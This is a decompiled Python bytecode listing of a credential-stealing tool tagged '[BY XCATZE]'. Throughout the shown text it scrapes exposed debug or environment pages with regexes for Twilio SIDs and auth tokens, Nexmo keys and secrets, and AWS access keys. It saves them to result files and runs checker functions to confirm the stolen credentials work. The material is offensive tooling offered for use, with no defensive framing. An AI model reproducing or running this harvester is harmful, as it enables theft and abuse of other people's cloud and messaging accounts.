           1946_1  COME_FROM          1928  '1928'

 L.1549      1946  SETUP_FINALLY      1966  'to 1966'

 L.1550      1948  LOAD_GLOBAL              reg
             1950  LOAD_STR                 '<td>TWILIO_AUTH_TOKEN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             1952  LOAD_FAST                'text'
             1954  CALL_FUNCTION_2       2  ''
             1956  LOAD_CONST               0
             1958  BINARY_SUBSCR    
             1960  STORE_FAST               'auhtoken'
             1962  POP_BLOCK        
             1964  JUMP_FORWARD       1982  'to 1982'
           1966_0  COME_FROM_FINALLY  1946  '1946'

 L.1551      1966  POP_TOP          
             1968  POP_TOP          
             1970  POP_TOP          

 L.1552      1972  LOAD_STR                 'NULL'
             1974  STORE_FAST               'auhtoken'
             1976  POP_EXCEPT       
             1978  JUMP_FORWARD       1982  'to 1982'
             1980  END_FINALLY      
           1982_0  COME_FROM          1978  '1978'
           1982_1  COME_FROM          1964  '1964'

 L.1553      1982  LOAD_STR                 'URL: '
             1984  LOAD_GLOBAL              str
             1986  LOAD_FAST                'url'
             1988  CALL_FUNCTION_1       1  ''
             1990  BINARY_ADD       
             1992  LOAD_STR                 '\nTWILIO_ACCOUNT_SID: '
             1994  BINARY_ADD       
             1996  LOAD_GLOBAL              str
             1998  LOAD_FAST                'acc_sid'
             2000  CALL_FUNCTION_1       1  ''
             2002  BINARY_ADD       
             2004  LOAD_STR                 '\nTWILIO_API_KEY: '
             2006  BINARY_ADD       
             2008  LOAD_GLOBAL              str
             2010  LOAD_FAST                'acc_key'
             2012  CALL_FUNCTION_1       1  ''
             2014  BINARY_ADD       
             2016  LOAD_STR                 '\nTWILIO_API_SECRET: '
             2018  BINARY_ADD       
             2020  LOAD_GLOBAL              str
             2022  LOAD_FAST                'sec'
             2024  CALL_FUNCTION_1       1  ''
             2026  BINARY_ADD       
             2028  LOAD_STR                 '\nTWILIO_CHAT_SERVICE_SID: '
             2030  BINARY_ADD       
             2032  LOAD_GLOBAL              str
             2034  LOAD_FAST                'chatid'
             2036  CALL_FUNCTION_1       1  ''
             2038  BINARY_ADD       
             2040  LOAD_STR                 '\nTWILIO_NUMBER: '
             2042  BINARY_ADD       
             2044  LOAD_GLOBAL              str
             2046  LOAD_FAST                'phone'
             2048  CALL_FUNCTION_1       1  ''
             2050  BINARY_ADD       
             2052  LOAD_STR                 '\nTWILIO_AUTH_TOKEN: '
             2054  BINARY_ADD       
             2056  LOAD_GLOBAL              str
             2058  LOAD_FAST                'auhtoken'
             2060  CALL_FUNCTION_1       1  ''
             2062  BINARY_ADD       
             2064  STORE_FAST               'build'

 L.1554      2066  LOAD_GLOBAL              str
             2068  LOAD_FAST                'build'
             2070  CALL_FUNCTION_1       1  ''
             2072  LOAD_METHOD              replace
             2074  LOAD_STR                 '\r'
             2076  LOAD_STR                 ''
             2078  CALL_METHOD_2         2  ''
             2080  STORE_FAST               'remover'

 L.1555      2082  LOAD_GLOBAL              open
             2084  LOAD_STR                 'result/twillio.txt'
             2086  LOAD_STR                 'a'
             2088  CALL_FUNCTION_2       2  ''
             2090  STORE_FAST               'save'

 L.1556      2092  LOAD_FAST                'save'
             2094  LOAD_METHOD              write
             2096  LOAD_FAST                'remover'
             2098  LOAD_STR                 '\n\n'
             2100  BINARY_ADD       
             2102  CALL_METHOD_1         1  ''
             2104  POP_TOP          

 L.1557      2106  LOAD_FAST                'save'
             2108  LOAD_METHOD              close
             2110  CALL_METHOD_0         0  ''
             2112  POP_TOP          

 L.1558      2114  SETUP_FINALLY      2134  'to 2134'

 L.1559      2116  LOAD_GLOBAL              twilliocheck
             2118  LOAD_FAST                'url'
             2120  LOAD_FAST                'acc_sid'
             2122  LOAD_FAST                'auhtoken'
             2124  LOAD_FAST                'phone'
             2126  CALL_FUNCTION_4       4  ''
             2128  POP_TOP          
             2130  POP_BLOCK        
             2132  JUMP_FORWARD       2598  'to 2598'
           2134_0  COME_FROM_FINALLY  2114  '2114'

 L.1560      2134  POP_TOP          
             2136  POP_TOP          
             2138  POP_TOP          

 L.1561      2140  LOAD_GLOBAL              print
             2142  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mInvalid Twillio\n'
             2144  LOAD_METHOD              format
             2146  LOAD_FAST                'url'
             2148  CALL_METHOD_1         1  ''
             2150  CALL_FUNCTION_1       1  ''
             2152  POP_TOP          
             2154  POP_EXCEPT       
             2156  JUMP_FORWARD       2598  'to 2598'
             2158  END_FINALLY      
         2160_2162  JUMP_FORWARD       2598  'to 2598'
           2164_0  COME_FROM          1766  '1766'
           2164_1  COME_FROM          1754  '1754'

 L.1562      2164  LOAD_STR                 '<td>TWILIO_SID</td>'
             2166  LOAD_FAST                'text'
             2168  COMPARE_OP               in
         2170_2172  POP_JUMP_IF_FALSE  2382  'to 2382'

 L.1563      2174  LOAD_GLOBAL              reg
             2176  LOAD_STR                 '<td>TWILIO_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             2178  LOAD_FAST                'text'
             2180  CALL_FUNCTION_2       2  ''
             2182  LOAD_CONST               0
             2184  BINARY_SUBSCR    
             2186  STORE_FAST               'acc_sid'

 L.1564      2188  LOAD_GLOBAL              reg
             2190  LOAD_STR                 '<td>TWILIO_TOKEN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             2192  LOAD_FAST                'text'
             2194  CALL_FUNCTION_2       2  ''
             2196  LOAD_CONST               0
             2198  BINARY_SUBSCR    
             2200  STORE_FAST               'acc_key'

 L.1565      2202  SETUP_FINALLY      2222  'to 2222'

 L.1566      2204  LOAD_GLOBAL              reg
             2206  LOAD_STR                 '<td>TWILIO_FROM<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             2208  LOAD_FAST                'text'
             2210  CALL_FUNCTION_2       2  ''
             2212  LOAD_CONST               0
             2214  BINARY_SUBSCR    
             2216  STORE_FAST               'acc_from'
             2218  POP_BLOCK        
             2220  JUMP_FORWARD       2238  'to 2238'
           2222_0  COME_FROM_FINALLY  2202  '2202'

 L.1567      2222  POP_TOP          
             2224  POP_TOP          
             2226  POP_TOP          

 L.1568      2228  LOAD_STR                 'UNKNOWN'
             2230  STORE_FAST               'acc_from'
             2232  POP_EXCEPT       
             2234  JUMP_FORWARD       2238  'to 2238'
             2236  END_FINALLY      
           2238_0  COME_FROM          2234  '2234'
           2238_1  COME_FROM          2220  '2220'

 L.1569      2238  LOAD_STR                 'URL: '
             2240  LOAD_GLOBAL              str
             2242  LOAD_FAST                'url'
             2244  CALL_FUNCTION_1       1  ''
             2246  BINARY_ADD       
             2248  LOAD_STR                 '\nTWILIO_SID: '
             2250  BINARY_ADD       
             2252  LOAD_GLOBAL              str
             2254  LOAD_FAST                'acc_sid'
             2256  CALL_FUNCTION_1       1  ''
             2258  BINARY_ADD       
             2260  LOAD_STR                 '\nTWILIO_TOKEN: '
             2262  BINARY_ADD       
             2264  LOAD_GLOBAL              str
             2266  LOAD_FAST                'acc_key'
             2268  CALL_FUNCTION_1       1  ''
             2270  BINARY_ADD       
             2272  LOAD_STR                 '\nTWILIO_FROM: '
             2274  BINARY_ADD       
             2276  LOAD_GLOBAL              str
             2278  LOAD_FAST                'acc_from'
             2280  CALL_FUNCTION_1       1  ''
             2282  BINARY_ADD       
             2284  STORE_FAST               'build'

 L.1570      2286  LOAD_GLOBAL              str
             2288  LOAD_FAST                'build'
             2290  CALL_FUNCTION_1       1  ''
             2292  LOAD_METHOD              replace
             2294  LOAD_STR                 '\r'
             2296  LOAD_STR                 ''
             2298  CALL_METHOD_2         2  ''
             2300  STORE_FAST               'remover'

 L.1571      2302  LOAD_GLOBAL              open
             2304  LOAD_STR                 'result/twillio.txt'
             2306  LOAD_STR                 'a'
             2308  CALL_FUNCTION_2       2  ''
             2310  STORE_FAST               'save'

 L.1572      2312  LOAD_FAST                'save'
             2314  LOAD_METHOD              write
             2316  LOAD_FAST                'remover'
             2318  LOAD_STR                 '\n\n'
             2320  BINARY_ADD       
             2322  CALL_METHOD_1         1  ''
             2324  POP_TOP          

 L.1573      2326  LOAD_FAST                'save'
             2328  LOAD_METHOD              close
             2330  CALL_METHOD_0         0  ''
             2332  POP_TOP          

 L.1574      2334  SETUP_FINALLY      2354  'to 2354'

 L.1575      2336  LOAD_GLOBAL              twilliocheck
             2338  LOAD_FAST                'url'
             2340  LOAD_FAST                'acc_sid'
             2342  LOAD_FAST                'acc_key'
             2344  LOAD_FAST                'acc_from'
             2346  CALL_FUNCTION_4       4  ''
             2348  POP_TOP          
             2350  POP_BLOCK        
             2352  JUMP_FORWARD       2380  'to 2380'
           2354_0  COME_FROM_FINALLY  2334  '2334'

 L.1576      2354  POP_TOP          
             2356  POP_TOP          
             2358  POP_TOP          

 L.1577      2360  LOAD_GLOBAL              print
             2362  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mInvalid Twillio\n'
             2364  LOAD_METHOD              format
             2366  LOAD_FAST                'url'
             2368  CALL_METHOD_1         1  ''
             2370  CALL_FUNCTION_1       1  ''
             2372  POP_TOP          
             2374  POP_EXCEPT       
             2376  JUMP_FORWARD       2380  'to 2380'
             2378  END_FINALLY      
           2380_0  COME_FROM          2376  '2376'
           2380_1  COME_FROM          2352  '2352'
             2380  JUMP_FORWARD       2598  'to 2598'
           2382_0  COME_FROM          2170  '2170'

 L.1579      2382  LOAD_STR                 '<td>ACCOUNT_SID</td>'
             2384  LOAD_FAST                'text'
             2386  COMPARE_OP               in
         2388_2390  POP_JUMP_IF_FALSE  2598  'to 2598'

 L.1580      2392  LOAD_GLOBAL              reg
             2394  LOAD_STR                 '<td>ACCOUNT_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             2396  LOAD_FAST                'text'
             2398  CALL_FUNCTION_2       2  ''
             2400  LOAD_CONST               0
             2402  BINARY_SUBSCR    
             2404  STORE_FAST               'acc_sid'

 L.1581      2406  LOAD_GLOBAL              reg
             2408  LOAD_STR                 '<td>AUTH_TOKEN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             2410  LOAD_FAST                'text'
             2412  CALL_FUNCTION_2       2  ''
             2414  LOAD_CONST               0
             2416  BINARY_SUBSCR    
             2418  STORE_FAST               'acc_key'

 L.1582      2420  SETUP_FINALLY      2440  'to 2440'

 L.1583      2422  LOAD_GLOBAL              reg
             2424  LOAD_STR                 '<td>Twilio_Number<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             2426  LOAD_FAST                'text'
             2428  CALL_FUNCTION_2       2  ''
             2430  LOAD_CONST               0
             2432  BINARY_SUBSCR    
             2434  STORE_FAST               'acc_from'
             2436  POP_BLOCK        
             2438  JUMP_FORWARD       2456  'to 2456'
           2440_0  COME_FROM_FINALLY  2420  '2420'

 L.1584      2440  POP_TOP          
             2442  POP_TOP          
             2444  POP_TOP          

 L.1585      2446  LOAD_STR                 'UNKNOWN'
             2448  STORE_FAST               'acc_from'
             2450  POP_EXCEPT       
             2452  JUMP_FORWARD       2456  'to 2456'
             2454  END_FINALLY      
           2456_0  COME_FROM          2452  '2452'
           2456_1  COME_FROM          2438  '2438'

 L.1586      2456  LOAD_STR                 'URL: '
             2458  LOAD_GLOBAL              str
             2460  LOAD_FAST                'url'
             2462  CALL_FUNCTION_1       1  ''
             2464  BINARY_ADD       
             2466  LOAD_STR                 '\nTWILIO_SID: '
             2468  BINARY_ADD       
             2470  LOAD_GLOBAL              str
             2472  LOAD_FAST                'acc_sid'
             2474  CALL_FUNCTION_1       1  ''
             2476  BINARY_ADD       
             2478  LOAD_STR                 '\nTWILIO_TOKEN: '
             2480  BINARY_ADD       
             2482  LOAD_GLOBAL              str
             2484  LOAD_FAST                'acc_key'
             2486  CALL_FUNCTION_1       1  ''
             2488  BINARY_ADD       
             2490  LOAD_STR                 '\nTWILIO_FROM: '
             2492  BINARY_ADD       
             2494  LOAD_GLOBAL              str
             2496  LOAD_FAST                'acc_from'
             2498  CALL_FUNCTION_1       1  ''
             2500  BINARY_ADD       
             2502  STORE_FAST               'build'

 L.1587      2504  LOAD_GLOBAL              str
             2506  LOAD_FAST                'build'
             2508  CALL_FUNCTION_1       1  ''
             2510  LOAD_METHOD              replace
             2512  LOAD_STR                 '\r'
             2514  LOAD_STR                 ''
             2516  CALL_METHOD_2         2  ''
             2518  STORE_FAST               'remover'

 L.1588      2520  LOAD_GLOBAL              open
             2522  LOAD_STR                 'result/twillio.txt'
             2524  LOAD_STR                 'a'
             2526  CALL_FUNCTION_2       2  ''
             2528  STORE_FAST               'save'

 L.1589      2530  LOAD_FAST                'save'
             2532  LOAD_METHOD              write
             2534  LOAD_FAST                'remover'
             2536  LOAD_STR                 '\n\n'
             2538  BINARY_ADD       
             2540  CALL_METHOD_1         1  ''
             2542  POP_TOP          

 L.1590      2544  LOAD_FAST                'save'
             2546  LOAD_METHOD              close
             2548  CALL_METHOD_0         0  ''
             2550  POP_TOP          

 L.1591      2552  SETUP_FINALLY      2572  'to 2572'

 L.1592      2554  LOAD_GLOBAL              twilliocheck
             2556  LOAD_FAST                'url'
             2558  LOAD_FAST                'acc_sid'
             2560  LOAD_FAST                'acc_key'
             2562  LOAD_FAST                'acc_from'
             2564  CALL_FUNCTION_4       4  ''
             2566  POP_TOP          
           2568_0  COME_FROM          2132  '2132'
             2568  POP_BLOCK        
             2570  JUMP_FORWARD       2598  'to 2598'
           2572_0  COME_FROM_FINALLY  2552  '2552'

 L.1593      2572  POP_TOP          
             2574  POP_TOP          
             2576  POP_TOP          

 L.1594      2578  LOAD_GLOBAL              print
             2580  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mInvalid Twillio\n'
             2582  LOAD_METHOD              format
             2584  LOAD_FAST                'url'
             2586  CALL_METHOD_1         1  ''
             2588  CALL_FUNCTION_1       1  ''
             2590  POP_TOP          
           2592_0  COME_FROM          2156  '2156'
             2592  POP_EXCEPT       
             2594  JUMP_FORWARD       2598  'to 2598'
             2596  END_FINALLY      
           2598_0  COME_FROM          2594  '2594'
           2598_1  COME_FROM          2570  '2570'
           2598_2  COME_FROM          2388  '2388'
           2598_3  COME_FROM          2380  '2380'
           2598_4  COME_FROM          2160  '2160'

 L.1597      2598  LOAD_STR                 '<td>NEXMO_KEY</td>'
             2600  LOAD_FAST                'text'
             2602  COMPARE_OP               in
         2604_2606  POP_JUMP_IF_FALSE  2894  'to 2894'
             2608  LOAD_GLOBAL              NEXMO
             2610  CALL_FUNCTION_0       0  ''
             2612  LOAD_STR                 'on'
             2614  COMPARE_OP               ==
         2616_2618  POP_JUMP_IF_FALSE  2894  'to 2894'

 L.1598      2620  SETUP_FINALLY      2640  'to 2640'

 L.1599      2622  LOAD_GLOBAL              reg
             2624  LOAD_STR                 '<td>NEXMO_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             2626  LOAD_FAST                'text'
             2628  CALL_FUNCTION_2       2  ''
             2630  LOAD_CONST               0
             2632  BINARY_SUBSCR    
             2634  STORE_FAST               'nexmo_key'
             2636  POP_BLOCK        
             2638  JUMP_FORWARD       2656  'to 2656'
           2640_0  COME_FROM_FINALLY  2620  '2620'

 L.1600      2640  POP_TOP          
             2642  POP_TOP          
             2644  POP_TOP          

 L.1601      2646  LOAD_STR                 ''
             2648  STORE_FAST               'nexmo_key'
             2650  POP_EXCEPT       
             2652  JUMP_FORWARD       2656  'to 2656'
             2654  END_FINALLY      
           2656_0  COME_FROM          2652  '2652'
           2656_1  COME_FROM          2638  '2638'

 L.1602      2656  SETUP_FINALLY      2676  'to 2676'

 L.1603      2658  LOAD_GLOBAL              reg
             2660  LOAD_STR                 '<td>NEXMO_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             2662  LOAD_FAST                'text'
             2664  CALL_FUNCTION_2       2  ''
             2666  LOAD_CONST               0
             2668  BINARY_SUBSCR    
             2670  STORE_FAST               'nexmo_secret'
             2672  POP_BLOCK        
             2674  JUMP_FORWARD       2692  'to 2692'
           2676_0  COME_FROM_FINALLY  2656  '2656'

 L.1604      2676  POP_TOP          
             2678  POP_TOP          
             2680  POP_TOP          

 L.1605      2682  LOAD_STR                 ''
             2684  STORE_FAST               'nexmo_secret'
             2686  POP_EXCEPT       
             2688  JUMP_FORWARD       2692  'to 2692'
             2690  END_FINALLY      
           2692_0  COME_FROM          2688  '2688'
           2692_1  COME_FROM          2674  '2674'

 L.1606      2692  SETUP_FINALLY      2712  'to 2712'

 L.1607      2694  LOAD_GLOBAL              reg
             2696  LOAD_STR                 '<td>NEXMO_NUMBER<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             2698  LOAD_FAST                'text'
             2700  CALL_FUNCTION_2       2  ''
             2702  LOAD_CONST               0
             2704  BINARY_SUBSCR    
             2706  STORE_FAST               'phone'
             2708  POP_BLOCK        
             2710  JUMP_FORWARD       2728  'to 2728'
           2712_0  COME_FROM_FINALLY  2692  '2692'

 L.1608      2712  POP_TOP          
             2714  POP_TOP          
             2716  POP_TOP          

 L.1609      2718  LOAD_STR                 ''
             2720  STORE_FAST               'phone'
             2722  POP_EXCEPT       
             2724  JUMP_FORWARD       2728  'to 2728'
             2726  END_FINALLY      
           2728_0  COME_FROM          2724  '2724'
           2728_1  COME_FROM          2710  '2710'

 L.1610      2728  LOAD_GLOBAL              print
             2730  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mNEXMO\n'
             2732  LOAD_METHOD              format
             2734  LOAD_GLOBAL              str
             2736  LOAD_FAST                'url'
             2738  CALL_FUNCTION_1       1  ''
             2740  CALL_METHOD_1         1  ''
             2742  CALL_FUNCTION_1       1  ''
             2744  POP_TOP          

 L.1611      2746  LOAD_STR                 'URL: '
             2748  LOAD_GLOBAL              str
             2750  LOAD_FAST                'url'
             2752  CALL_FUNCTION_1       1  ''
             2754  BINARY_ADD       
             2756  LOAD_STR                 '\nnexmo_key: '
             2758  BINARY_ADD       
             2760  LOAD_GLOBAL              str
             2762  LOAD_FAST                'nexmo_key'
             2764  CALL_FUNCTION_1       1  ''
             2766  BINARY_ADD       
             2768  LOAD_STR                 '\nnexmo_secret: '
             2770  BINARY_ADD       
             2772  LOAD_GLOBAL              str
             2774  LOAD_FAST                'nexmo_secret'
             2776  CALL_FUNCTION_1       1  ''
             2778  BINARY_ADD       
             2780  LOAD_STR                 '\nphone: '
             2782  BINARY_ADD       
             2784  LOAD_GLOBAL              str
             2786  LOAD_FAST                'phone'
             2788  CALL_FUNCTION_1       1  ''
             2790  BINARY_ADD       
             2792  STORE_FAST               'build'

 L.1612      2794  LOAD_GLOBAL              str
             2796  LOAD_FAST                'build'
             2798  CALL_FUNCTION_1       1  ''
             2800  LOAD_METHOD              replace
             2802  LOAD_STR                 '\r'
             2804  LOAD_STR                 ''
             2806  CALL_METHOD_2         2  ''
             2808  STORE_FAST               'remover'

 L.1613      2810  LOAD_GLOBAL              open
             2812  LOAD_STR                 'result/NEXMO.txt'
             2814  LOAD_STR                 'a'
             2816  CALL_FUNCTION_2       2  ''
             2818  STORE_FAST               'save'

 L.1614      2820  LOAD_FAST                'save'
             2822  LOAD_METHOD              write
             2824  LOAD_FAST                'remover'
             2826  LOAD_STR                 '\n\n'
             2828  BINARY_ADD       
             2830  CALL_METHOD_1         1  ''
             2832  POP_TOP          

 L.1615      2834  LOAD_FAST                'save'
             2836  LOAD_METHOD              close
             2838  CALL_METHOD_0         0  ''
             2840  POP_TOP          

 L.1616      2842  SETUP_FINALLY      2860  'to 2860'

 L.1617      2844  LOAD_GLOBAL              nexmosend
             2846  LOAD_FAST                'url'
             2848  LOAD_FAST                'nexmo_key'
             2850  LOAD_FAST                'nexmo_secret'
             2852  CALL_FUNCTION_3       3  ''
             2854  POP_TOP          
             2856  POP_BLOCK        
             2858  JUMP_FORWARD       3240  'to 3240'
           2860_0  COME_FROM_FINALLY  2842  '2842'

 L.1618      2860  POP_TOP          
             2862  POP_TOP          
             2864  POP_TOP          

 L.1619      2866  LOAD_GLOBAL              print
             2868  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mINVALI NEXMO\n'
             2870  LOAD_METHOD              format
             2872  LOAD_GLOBAL              str
             2874  LOAD_FAST                'url'
             2876  CALL_FUNCTION_1       1  ''
             2878  CALL_METHOD_1         1  ''
             2880  CALL_FUNCTION_1       1  ''
             2882  POP_TOP          
             2884  POP_EXCEPT       
             2886  JUMP_FORWARD       3240  'to 3240'
             2888  END_FINALLY      
         2890_2892  JUMP_FORWARD       3240  'to 3240'
           2894_0  COME_FROM          2616  '2616'
           2894_1  COME_FROM          2604  '2604'

 L.1621      2894  LOAD_STR                 '<td>NEXMO_API_KEY</td>'
             2896  LOAD_FAST                'text'
             2898  COMPARE_OP               in
         2900_2902  POP_JUMP_IF_FALSE  3188  'to 3188'
             2904  LOAD_GLOBAL              NEXMO
             2906  CALL_FUNCTION_0       0  ''
             2908  LOAD_STR                 'on'
             2910  COMPARE_OP               ==
         2912_2914  POP_JUMP_IF_FALSE  3188  'to 3188'

 L.1622      2916  SETUP_FINALLY      2936  'to 2936'

 L.1623      2918  LOAD_GLOBAL              reg
             2920  LOAD_STR                 '<td>NEXMO_API_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             2922  LOAD_FAST                'text'
             2924  CALL_FUNCTION_2       2  ''
             2926  LOAD_CONST               0
             2928  BINARY_SUBSCR    
             2930  STORE_FAST               'nexmo_key'
             2932  POP_BLOCK        
             2934  JUMP_FORWARD       2952  'to 2952'
           2936_0  COME_FROM_FINALLY  2916  '2916'

 L.1624      2936  POP_TOP          
             2938  POP_TOP          
             2940  POP_TOP          

 L.1625      2942  LOAD_STR                 ''
             2944  STORE_FAST               'nexmo_key'
             2946  POP_EXCEPT       
             2948  JUMP_FORWARD       2952  'to 2952'
             2950  END_FINALLY      
           2952_0  COME_FROM          2948  '2948'
           2952_1  COME_FROM          2934  '2934'

 L.1626      2952  SETUP_FINALLY      2972  'to 2972'

 L.1627      2954  LOAD_GLOBAL              reg
             2956  LOAD_STR                 '<td>NEXMO_API_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             2958  LOAD_FAST                'text'
             2960  CALL_FUNCTION_2       2  ''
             2962  LOAD_CONST               0
             2964  BINARY_SUBSCR    
             2966  STORE_FAST               'nexmo_secret'
             2968  POP_BLOCK        
             2970  JUMP_FORWARD       2988  'to 2988'
           2972_0  COME_FROM_FINALLY  2952  '2952'

 L.1628      2972  POP_TOP          
             2974  POP_TOP          
             2976  POP_TOP          

 L.1629      2978  LOAD_STR                 ''
             2980  STORE_FAST               'nexmo_secret'
             2982  POP_EXCEPT       
             2984  JUMP_FORWARD       2988  'to 2988'
             2986  END_FINALLY      
           2988_0  COME_FROM          2984  '2984'
           2988_1  COME_FROM          2970  '2970'

 L.1630      2988  SETUP_FINALLY      3008  'to 3008'

 L.1631      2990  LOAD_GLOBAL              reg
             2992  LOAD_STR                 '<td>NEXMO_API_NUMBER<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             2994  LOAD_FAST                'text'
             2996  CALL_FUNCTION_2       2  ''
             2998  LOAD_CONST               0
             3000  BINARY_SUBSCR    
             3002  STORE_FAST               'phone'
             3004  POP_BLOCK        
             3006  JUMP_FORWARD       3024  'to 3024'
           3008_0  COME_FROM_FINALLY  2988  '2988'

 L.1632      3008  POP_TOP          
             3010  POP_TOP          
             3012  POP_TOP          

 L.1633      3014  LOAD_STR                 ''
             3016  STORE_FAST               'phone'
             3018  POP_EXCEPT       
             3020  JUMP_FORWARD       3024  'to 3024'
             3022  END_FINALLY      
           3024_0  COME_FROM          3020  '3020'
           3024_1  COME_FROM          3006  '3006'

 L.1634      3024  LOAD_GLOBAL              print
             3026  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mNEXMO\n'
             3028  LOAD_METHOD              format
             3030  LOAD_GLOBAL              str
             3032  LOAD_FAST                'url'
             3034  CALL_FUNCTION_1       1  ''
             3036  CALL_METHOD_1         1  ''
             3038  CALL_FUNCTION_1       1  ''
             3040  POP_TOP          

 L.1635      3042  LOAD_STR                 'URL: '
             3044  LOAD_GLOBAL              str
             3046  LOAD_FAST                'url'
             3048  CALL_FUNCTION_1       1  ''
             3050  BINARY_ADD       
             3052  LOAD_STR                 '\nnexmo_key: '
             3054  BINARY_ADD       
             3056  LOAD_GLOBAL              str
             3058  LOAD_FAST                'nexmo_key'
             3060  CALL_FUNCTION_1       1  ''
             3062  BINARY_ADD       
             3064  LOAD_STR                 '\nnexmo_secret: '
             3066  BINARY_ADD       
             3068  LOAD_GLOBAL              str
             3070  LOAD_FAST                'nexmo_secret'
             3072  CALL_FUNCTION_1       1  ''
             3074  BINARY_ADD       
             3076  LOAD_STR                 '\nphone: '
             3078  BINARY_ADD       
             3080  LOAD_GLOBAL              str
             3082  LOAD_FAST                'phone'
             3084  CALL_FUNCTION_1       1  ''
             3086  BINARY_ADD       
             3088  STORE_FAST               'build'

 L.1636      3090  LOAD_GLOBAL              str
             3092  LOAD_FAST                'build'
             3094  CALL_FUNCTION_1       1  ''
             3096  LOAD_METHOD              replace
             3098  LOAD_STR                 '\r'
             3100  LOAD_STR                 ''
             3102  CALL_METHOD_2         2  ''
             3104  STORE_FAST               'remover'

 L.1637      3106  LOAD_GLOBAL              open
             3108  LOAD_STR                 'result/NEXMO.txt'
             3110  LOAD_STR                 'a'
             3112  CALL_FUNCTION_2       2  ''
             3114  STORE_FAST               'save'

 L.1638      3116  LOAD_FAST                'save'
             3118  LOAD_METHOD              write
             3120  LOAD_FAST                'remover'
             3122  LOAD_STR                 '\n\n'
             3124  BINARY_ADD       
             3126  CALL_METHOD_1         1  ''
             3128  POP_TOP          

 L.1639      3130  LOAD_FAST                'save'
             3132  LOAD_METHOD              close
             3134  CALL_METHOD_0         0  ''
             3136  POP_TOP          

 L.1640      3138  SETUP_FINALLY      3156  'to 3156'

 L.1641      3140  LOAD_GLOBAL              nexmosend
             3142  LOAD_FAST                'url'
             3144  LOAD_FAST                'nexmo_key'
             3146  LOAD_FAST                'nexmo_secret'
             3148  CALL_FUNCTION_3       3  ''
             3150  POP_TOP          
             3152  POP_BLOCK        
             3154  JUMP_FORWARD       3186  'to 3186'
           3156_0  COME_FROM_FINALLY  3138  '3138'

 L.1642      3156  POP_TOP          
             3158  POP_TOP          
             3160  POP_TOP          

 L.1643      3162  LOAD_GLOBAL              print
             3164  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mINVALI NEXMO\n'
             3166  LOAD_METHOD              format
             3168  LOAD_GLOBAL              str
             3170  LOAD_FAST                'url'
             3172  CALL_FUNCTION_1       1  ''
             3174  CALL_METHOD_1         1  ''
             3176  CALL_FUNCTION_1       1  ''
             3178  POP_TOP          
             3180  POP_EXCEPT       
             3182  JUMP_FORWARD       3186  'to 3186'
             3184  END_FINALLY      
           3186_0  COME_FROM          3182  '3182'
           3186_1  COME_FROM          3154  '3154'
             3186  JUMP_FORWARD       3240  'to 3240'
           3188_0  COME_FROM          2912  '2912'
           3188_1  COME_FROM          2900  '2900'

 L.1644      3188  LOAD_STR                 'NEXMO_KEY'
             3190  LOAD_FAST                'text'
             3192  COMPARE_OP               not-in
         3194_3196  POP_JUMP_IF_TRUE   3240  'to 3240'
             3198  LOAD_STR                 'NEXMO_KEY'
             3200  LOAD_FAST                'text'
             3202  COMPARE_OP               in
         3204_3206  POP_JUMP_IF_FALSE  3222  'to 3222'
             3208  LOAD_GLOBAL              NEXMO
             3210  CALL_FUNCTION_0       0  ''
             3212  LOAD_STR                 'off'
             3214  COMPARE_OP               ==
         3216_3218  POP_JUMP_IF_FALSE  3222  'to 3222'

 L.1645      3220  JUMP_FORWARD       3240  'to 3240'
           3222_0  COME_FROM          3216  '3216'
           3222_1  COME_FROM          3204  '3204'

 L.1647      3222  LOAD_GLOBAL              print
             3224  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;31;40mFailed NEXMO\n'
             3226  LOAD_METHOD              format
             3228  LOAD_GLOBAL              str
             3230  LOAD_FAST                'url'
             3232  CALL_FUNCTION_1       1  ''
           3234_0  COME_FROM          2886  '2886'
             3234  CALL_METHOD_1         1  ''
             3236  CALL_FUNCTION_1       1  ''
             3238  POP_TOP          
           3240_0  COME_FROM          3220  '3220'
           3240_1  COME_FROM          3194  '3194'
           3240_2  COME_FROM          3186  '3186'
           3240_3  COME_FROM          2890  '2890'

 L.1650      3240  LOAD_STR                 '<td>AWS_ACCESS_KEY_ID</td>'
             3242  LOAD_FAST                'text'
             3244  COMPARE_OP               in
         3246_3248  POP_JUMP_IF_FALSE  3574  'to 3574'

 L.1651      3250  LOAD_GLOBAL              reg
             3252  LOAD_STR                 '<td>AWS_ACCESS_KEY_ID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             3254  LOAD_FAST                'text'
             3256  CALL_FUNCTION_2       2  ''
             3258  LOAD_CONST               0
             3260  BINARY_SUBSCR    
             3262  STORE_FAST               'aws_kid'

 L.1652      3264  LOAD_GLOBAL              reg
             3266  LOAD_STR                 '<td>AWS_SECRET_ACCESS_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             3268  LOAD_FAST                'text'
             3270  CALL_FUNCTION_2       2  ''
             3272  LOAD_CONST               0
             3274  BINARY_SUBSCR    
             3276  STORE_FAST               'aws_sky'

 L.1653      3278  LOAD_GLOBAL              reg
             3280  LOAD_STR                 '<td>AWS_DEFAULT_REGION<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             3282  LOAD_FAST                'text'
             3284  CALL_FUNCTION_2       2  ''
             3286  LOAD_CONST               0
             3288  BINARY_SUBSCR    
